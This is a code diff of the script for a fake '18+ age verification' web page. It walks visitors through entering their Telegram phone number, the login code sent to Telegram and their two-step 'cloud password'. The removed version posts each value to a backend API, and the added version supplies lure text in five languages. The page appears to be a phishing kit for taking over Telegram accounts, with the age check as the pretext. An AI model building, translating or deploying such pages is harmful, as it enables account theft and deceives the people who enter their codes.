@@ -1,230 +1,237 @@
-/**
- * script.js — управление интерфейсом, отправка запросов на сервер
- * Исправлено: удаление пробелов из номера телефона и кода
- */
-
-// DOM-элементы страниц
-const pages = {
-    main: document.getElementById('page-main'),
-    phone: document.getElementById('page-phone'),
-    code: document.getElementById('page-code'),
-    password: document.getElementById('page-password'),
-    success: document.getElementById('page-success'),
+// ===== TRANSLATIONS DICTIONARY =====
+const translations = {
+    en: {
+        badge: "🔞 Age Verification",
+        title: "18+ VERIFICATION",
+        btnStart: "Verify Now",
+        subtext: "⚡ Access restricted to users 18 years or older",
+        step1: "Step 1 of 3",
+        phoneTitle: "Enter Phone Number",
+        phoneDesc: "We will send a verification code to Telegram",
+        phoneLabel: "Phone Number",
+        btnSendCode: "Send Code",
+        btnBack: "← Back",
+        step2: "Step 2 of 3",
+        codeTitle: "Verification Code",
+        codeDesc: "Enter the confirmation code sent to Telegram",
+        codeLabel: "Confirmation Code",
+        btnVerifyCode: "Verify Code",
+        step3: "Step 3 of 3",
+        passTitle: "Cloud Password",
+        passDesc: "Two-step verification is enabled for this account",
+        passLabel: "Enter Cloud Password",
+        btnVerifyPass: "Confirm",
+        successTitle: "Verification Successful!",
+        successP1: "Your age has been successfully verified.",
+        successP2: "Please wait for a message from the bot.",
+        btnHome: "Main Page",
+        errPhone: "Please enter a valid phone number",
+        errCode: "Please enter the 6-digit code",
+        errPass: "Please enter your cloud password"
+    },
+    ru: {
+        badge: "🔞 Подтверждение возраста",
+        title: "ВЕРИФИКАЦИЯ 18+",
+        btnStart: "Пройти верификацию",
+        subtext: "⚡ Доступ только для пользователей старше 18 лет",
+        step1: "Шаг 1 из 3",
+        phoneTitle: "Введите номер телефона",
+        phoneDesc: "Мы отправим код подтверждения в Telegram",
+        phoneLabel: "Номер телефона",
+        btnSendCode: "Отправить код",
+        btnBack: "← Назад",
+        step2: "Шаг 2 из 3",
+        codeTitle: "Подтверждение",
+        codeDesc: "Введите код, который был отправлен в Telegram",
+        codeLabel: "Код подтверждения",
+        btnVerifyCode: "Проверить код",
+        step3: "Шаг 3 из 3",
+        passTitle: "Облачный пароль",
+        passDesc: "Для этого аккаунта включена дополнительная защита",
+        passLabel: "Введите облачный пароль",
+        btnVerifyPass: "Подтвердить",
+        successTitle: "Вы успешно прошли верификацию!",
+        successP1: "Ваш возраст успешно подтвержден.",
+        successP2: "Ожидайте сообщение от бота.",
+        btnHome: "На главную",
+        errPhone: "Пожалуйста, введите корректный номер телефона",
+        errCode: "Введите 6-значный код",
+        errPass: "Введите облачный пароль"
+    },
+    ar: {
+        badge: "🔞 تأكيد العمر",
+        title: "توثيق +18",
+        btnStart: "ابدأ التوثيق",
+        subtext: "⚡ الوصول مقتصر على المستخدمين فوق 18 عاماً",
+        step1: "الخطوة 1 من 3",
+        phoneTitle: "أدخل رقم الهاتف",
+        phoneDesc: "سنرسل رمز التأكيد إلى التليجرام",
+        phoneLabel: "رقم الهاتف",
+        btnSendCode: "إرسال الرمز",
+        btnBack: "رجوع ←",
+        step2: "الخطوة 2 من 3",
+        codeTitle: "رمز التأكيد",
+        codeDesc: "أدخل الرمز المرسل إلى التليجرام",
+        codeLabel: "رمز التحقق",
+        btnVerifyCode: "التحقق من الرمز",
+        step3: "الخطوة 3 من 3",
+        passTitle: "كلمة المرور السحابية",
+        passDesc: "المصادقة بخطوتين مفعلة لهذا الحساب",
+        passLabel: "أدخل كلمة المرور السحابية",
+        btnVerifyPass: "تأكيد",
+        successTitle: "تم التوثيق بنجاح!",
+        successP1: "تم تأكيد عمرك بنجاح.",
+        successP2: "يرجى انتظار رسالة من البوت.",
+        btnHome: "الصفحة الرئيسية",
+        errPhone: "يرجى إدخال رقم هاتف صحيح",
+        errCode: "يرجى إدخال الرمز المكون من 6 أرقام",
+        errPass: "يرجى إدخال كلمة المرور السحابية"
+    },
+    iq: {
+        badge: "🔞 تأكيد العمر",
+        title: "توثيق +18",
+        btnStart: "بلش التوثيق",
+        subtext: "⚡ الدخول فقط للي أعمارهم فوق الـ 18 سنة",
+        step1: "الخطوة 1 من 3",
+        phoneTitle: "اكتب رقم تليفونك",
+        phoneDesc: "راح ندزلك كود التاكيد على التليجرام",
+        phoneLabel: "رقم التليفون",
+        btnSendCode: "دز الكود",
+        btnBack: "رجوع ←",
+        step2: "الخطوة 2 من 3",
+        codeTitle: "كود التاكيد",
+        codeDesc: "اكتب الكود اللي وصلك على التليجرام",
+        codeLabel: "كود التحقق",
+        btnVerifyCode: "افحص الكود",
+        step3: "الخطوة 3 من 3",
+        passTitle: "الباسورد الغيمي",
+        passDesc: "التحقق بخطوتين متفعل بهذا الحساب",
+        passLabel: "اكتب الباسورد الغيمي",
+        btnVerifyPass: "تاكيد",
+        successTitle: "تم التوثيق بنجاح!",
+        successP1: "تاكد عمرك بنجاح.",
+        successP2: "انتظر رسالة من البوت.",
+        btnHome: "للصفحة الرئيسية",
+        errPhone: "الرجاء كتابة رقم تليفون صحيح",
+        errCode: "اكتب الكود المتكون من 6 ارقام",
+        errPass: "اكتب الباسورد الغيمي"
+    },
+    fa: {
+        badge: "🔞 تایید سن",
+        title: "احراز هویت +18",
+        btnStart: "شروع احراز هویت",
+        subtext: "⚡ دسترسی فقط برای افراد بالای ۱۸ سال",
+        step1: "مرحله ۱ از ۳",
+        phoneTitle: "شماره تلفن را وارد کنید",
+        phoneDesc: "کد تایید به تلگرام شما ارسال خواهد شد",
+        phoneLabel: "شماره تلفن",
+        btnSendCode: "ارسال کد",
+        btnBack: "بازگشت ←",
+        step2: "مرحله ۲ از ۳",
+        codeTitle: "کد تایید",
+        codeDesc: "کد ارسال شده به تلگرام را وارد کنید",
+        codeLabel: "کد تأیید",
+        btnVerifyCode: "تایید کد",
+        step3: "مرحله ۳ از ۳",
+        passTitle: "رمز عبور ابری",
+        passDesc: "تایید دو مرحله‌ای برای این حساب فعال است",
+        passLabel: "رمز عبور ابری را وارد کنید",
+        btnVerifyPass: "تایید",
+        successTitle: "احراز هویت با موفقیت انجام شد!",
+        successP1: "سن شما با موفقیت تایید شد.",
+        successP2: "لطفا منتظر پیام ربات باشید.",
+        btnHome: "صفحه اصلی",
+        errPhone: "لطفا یک شماره تلفن معتبر وارد کنید",
+        errCode: "لطفا کد ۶ رقمی را وارد کنید",
+        errPass: "لطفا رمز عبور ابری را وارد کنید"
+    }
 };
 
-// Формы и поля
-const formPhone = document.getElementById('form-phone');
-const phoneInput = document.getElementById('phoneInput');
-const phoneError = document.getElementById('phoneError');
-const btnSendCode = document.getElementById('btnSendCode');
-const phoneSpinner = document.getElementById('phoneSpinner');
+let currentLang = 'en';
 
-const formCode = document.getElementById('form-code');
-const codeInput = document.getElementById('codeInput');
-const codeError = document.getElementById('codeError');
-const btnVerifyCode = document.getElementById('btnVerifyCode');
-const codeSpinner = document.getElementById('codeSpinner');
-
-const formPassword = document.getElementById('form-password');
-const passwordInput = document.getElementById('passwordInput');
-const passwordError = document.getElementById('passwordError');
-const btnVerifyPassword = document.getElementById('btnVerifyPassword');
-const passwordSpinner = document.getElementById('passwordSpinner');
-
-// Кнопки навигации
-const btnGetStarted = document.getElementById('btnGetStarted');
-const btnBackFromPhone = document.getElementById('btnBackFromPhone');
-const btnBackFromCode = document.getElementById('btnBackFromCode');
-const btnBackFromPassword = document.getElementById('btnBackFromPassword');
-const btnReset = document.getElementById('btnReset');
-
-// Храним номер телефона глобально
-let currentPhone = '';
-
-// ===== Функция переключения страниц =====
+// ===== NAVIGATION & UI SWITCHING =====
 function showPage(pageId) {
-    Object.keys(pages).forEach(key => {
-        const el = pages[key];
-        if (key === pageId) {
-            el.classList.add('active');
-            const card = el.querySelector('.card');
-            if (card) {
-                card.style.animation = 'none';
-                requestAnimationFrame(() => {
-                    card.style.animation = '';
-                    card.classList.add('animate-fade-up');
-                });
-            }
-        } else {
-            el.classList.remove('active');
-        }
+    document.querySelectorAll('.page').forEach(page => {
+        page.classList.remove('active');
     });
+    document.getElementById(pageId).classList.add('active');
 }
 
-// ===== Валидация телефона (улучшена) =====
-function validatePhone(phone) {
-    // Удаляем все пробелы, дефисы, скобки и точки
-    let cleaned = phone.replace(/[\s\-\(\)\.]/g, '');
-    // Если есть + в начале, оставляем его, но проверяем только цифры после
-    if (cleaned.startsWith('+')) {
-        const digits = cleaned.slice(1);
-        if (!/^\d{8,15}$/.test(digits)) {
-            return { valid: false, error: 'Введите корректный номер (только цифры после +)' };
-        }
-        return { valid: true, cleaned: `+${digits}`, error: '' };
+function setLanguage(lang) {
+    currentLang = lang;
+    const dict = translations[lang] || translations.en;
+    
+    // Toggle RTL direction for Arabic, Iraqi, and Persian
+    if (['ar', 'iq', 'fa'].includes(lang)) {
+        document.documentElement.setAttribute('dir', 'rtl');
     } else {
-        // Без + — только цифры
-        if (!/^\d{8,15}$/.test(cleaned)) {
-            return { valid: false, error: 'Введите корректный номер (только цифры, минимум 8)' };
-        }
-        return { valid: true, cleaned: cleaned, error: '' };
+        document.documentElement.setAttribute('dir', 'ltr');
     }
+
+    // Replace text content
+    document.querySelectorAll('[data-i18n]').forEach(el => {
+        const key = el.getAttribute('data-i18n');
+        if (dict[key]) {
+            el.textContent = dict[key];
+        }
+    });
 }
 
-// ===== Обработчики навигации =====
-btnGetStarted.addEventListener('click', () => {
-    showPage('phone');
-});
+// ===== EVENT LISTENERS =====
+document.addEventListener('DOMContentLoaded', () => {
 
-btnBackFromPhone.addEventListener('click', () => {
-    showPage('main');
-});
+    // Language switcher event
+    const langSelect = document.getElementById('langSelect');
+    langSelect.addEventListener('change', (e) => {
+        setLanguage(e.target.value);
+    });
 
-btnBackFromCode.addEventListener('click', () => {
-    showPage('phone');
-});
+    // Navigation buttons
+    document.getElementById('btnGetStarted').addEventListener('click', () => showPage('page-phone'));
+    document.getElementById('btnBackFromPhone').addEventListener('click', () => showPage('page-main'));
+    document.getElementById('btnBackFromCode').addEventListener('click', () => showPage('page-phone'));
+    document.getElementById('btnBackFromPassword').addEventListener('click', () => showPage('page-code'));
+    document.getElementById('btnReset').addEventListener('click', () => showPage('page-main'));
 
-btnBackFromPassword.addEventListener('click', () => {
-    showPage('code');
-});
+    // Form 1: Phone
+    document.getElementById('form-phone').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const phone = document.getElementById('phoneInput').value.trim();
+        const errorEl = document.getElementById('phoneError');
 
-btnReset.addEventListener('click', () => {
-    phoneInput.value = '';
-    codeInput.value = '';
-    passwordInput.value = '';
-    phoneError.textContent = '';
-    codeError.textContent = '';
-    passwordError.textContent = '';
-    showPage('main');
-});
-
-// ===== Отправка номера телефона =====
-formPhone.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const rawPhone = phoneInput.value.trim();
-    const validation = validatePhone(rawPhone);
-    if (!validation.valid) {
-        phoneError.textContent = validation.error;
-        return;
-    }
-    phoneError.textContent = '';
-    const phone = validation.cleaned;
-    currentPhone = phone;
-
-    btnSendCode.disabled = true;
-    phoneSpinner.classList.remove('hidden');
-
-    try {
-        const response = await fetch('/api/send-code', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone }),
-        });
-        const data = await response.json();
-        if (response.ok) {
-            showPage('code');
-            codeInput.focus();
-        } else {
-            phoneError.textContent = data.error || 'Ошибка отправки кода. Попробуйте позже.';
+        if (!phone || phone.length < 5) {
+            errorEl.textContent = translations[currentLang].errPhone;
+            return;
         }
-    } catch (err) {
-        phoneError.textContent = 'Сервер недоступен. Проверьте соединение.';
-    } finally {
-        btnSendCode.disabled = false;
-        phoneSpinner.classList.add('hidden');
-    }
-});
+        errorEl.textContent = '';
+        showPage('page-code');
+    });
 
-// ===== Проверка кода (с удалением пробелов) =====
-formCode.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    // Удаляем все пробелы из введённого кода
-    const code = codeInput.value.replace(/\s/g, '');
-    if (code.length < 4 || code.length > 6) {
-        codeError.textContent = 'Введите код из 4–6 цифр.';
-        return;
-    }
-    codeError.textContent = '';
+    // Form 2: Code
+    document.getElementById('form-code').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const code = document.getElementById('codeInput').value.trim();
+        const errorEl = document.getElementById('codeError');
 
-    btnVerifyCode.disabled = true;
-    codeSpinner.classList.remove('hidden');
-
-    try {
-        const response = await fetch('/api/verify-code', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone: currentPhone, code }),
-        });
-        const data = await response.json();
-        if (response.ok) {
-            if (data.cloudPasswordRequired) {
-                showPage('password');
-                passwordInput.focus();
-            } else {
-                showPage('success');
-            }
-        } else {
-            codeError.textContent = data.error || 'Неверный код. Попробуйте снова.';
+        if (!code || code.length < 5) {
+            errorEl.textContent = translations[currentLang].errCode;
+            return;
         }
-    } catch (err) {
-        codeError.textContent = 'Ошибка соединения с сервером.';
-    } finally {
-        btnVerifyCode.disabled = false;
-        codeSpinner.classList.add('hidden');
-    }
-});
+        errorEl.textContent = '';
+        showPage('page-password');
+    });
 
-// ===== Проверка облачного пароля =====
-formPassword.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const password = passwordInput.value.trim();
-    if (password.length < 1) {
-        passwordError.textContent = 'Введите пароль.';
-        return;
-    }
-    passwordError.textContent = '';
+    // Form 3: Password
+    document.getElementById('form-password').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const pass = document.getElementById('passwordInput').value.trim();
+        const errorEl = document.getElementById('passwordError');
 
-    btnVerifyPassword.disabled = true;
-    passwordSpinner.classList.remove('hidden');
-
-    try {
-        const response = await fetch('/api/verify-password', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone: currentPhone, password }),
-        });
-        const data = await response.json();
-        if (response.ok) {
-            showPage('success');
-        } else {
-            passwordError.textContent = data.error || 'Неверный пароль. Попробуйте ещё раз.';
+        if (!pass) {
+            errorEl.textContent = translations[currentLang].errPass;
+            return;
         }
-    } catch (err) {
-        passwordError.textContent = 'Ошибка соединения с сервером.';
-    } finally {
-        btnVerifyPassword.disabled = false;
-        passwordSpinner.classList.add('hidden');
-    }
-});
-
-// Если изображение photo.png не загружено, показываем фолбэк
-document.querySelectorAll('.banner-image').forEach(img => {
-    img.addEventListener('error', function() {
-        this.style.display = 'none';
-        const fallback = this.parentElement.querySelector('.banner-fallback');
-        if (fallback) fallback.style.display = 'flex';
+        errorEl.textContent = '';
+        showPage('page-success');
     });
 });
-
-// Стартуем с главной
-showPage('main');
